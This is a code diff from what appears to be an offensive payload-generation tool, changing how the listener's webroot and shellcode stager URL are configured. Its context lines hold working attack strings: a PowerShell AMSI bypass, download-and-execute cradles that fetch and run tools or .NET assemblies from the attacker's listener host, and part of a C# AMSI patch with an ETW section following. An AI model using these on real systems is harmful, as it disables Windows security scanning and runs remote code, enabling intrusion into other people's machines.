@@ -19,9 +19,11 @@ with open('config.yaml', 'r') as file:
 
 LHOST = ni.ifaddresses(conf['listener']['interface'])[ni.AF_INET][0]['addr']
 LPORT = conf['listener']['lport']
-WEBROOT = conf['listener']['webroot']
+WEBROOT_DIR = conf['listener']['webroot_dir']
+WEBROOT_URL = conf['listener']['webroot_url']
 
-STAGER_URL = f"https://{LHOST}/sc"
+SHELLCODE_FN = "sc"
+STAGER_URL = WEBROOT_URL + SHELLCODE_FN
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
 PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
 PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_namespace}.{tool_classname}]::{entrypoint}({cmd})'''
@@ -54,7 +56,6 @@ AMSI_BYPASS_CODE = """
         //silent continue
       }
         VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
-
 """
 
 ETW_FUNCS = f"""
